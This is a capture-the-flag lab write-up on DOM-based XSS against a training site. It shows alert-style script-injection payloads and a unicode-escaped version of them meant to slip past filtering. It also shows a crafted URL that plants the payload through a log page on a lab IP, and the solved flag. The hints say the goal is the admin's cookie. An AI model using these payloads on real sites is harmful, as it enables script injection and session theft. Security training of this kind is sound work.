# Lab 9.3 Dom-Based XSS

## 0x00 Basic Knowledge

The cause for XSS is that computers cannot distinguish user input and original web data. User can insert JavaScript to a web page and all users can visit it is stored-xss.

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### Hints

1. Reflected-XSS at index
2. Stored into dom.php
3. Get admin's cookie

### [Home Page][2]

![](./imgs/index.jpg)

### Try Inject Everywhere

```html
<script>alert`xss`</script>
````

![](./imgs/inject.jpg)

Inject success.

![](./imgs/xss.jpg)

### DOM XSS

```html
<script>document.write("/3/");</script>
```

![](./imgs/js.jpg)

```html
?<script>alert`1`</script><script>alert`1`</script>
```

Inject success.

![](./imgs/dom_xss.jpg)

### ASCII

As **document.write()** also accepts ASCII, we can conver js to [ascii format][3].

```
?\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0060\u0031\u0060\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e
```

![](./imgs/ascii.jpg)

### DOM Page

So we may log the url to dom page. And check the log.html.

```
http://120.203.13.75:6815/3/dom.php?url=http://120.203.13.75:6815/3/?\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0060\u0031\u0060\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e
```

### Get FLAG

![](./imgs/flag.jpg)

flag=zkz{x3ser-D0m}

[1]: https://hack.zkaq.org/?a=battle&f=target&id=5af6bd4e332164e7
[2]: http://120.203.13.75:6815/3/
[3]: http://tool.oschina.net/encode?type=3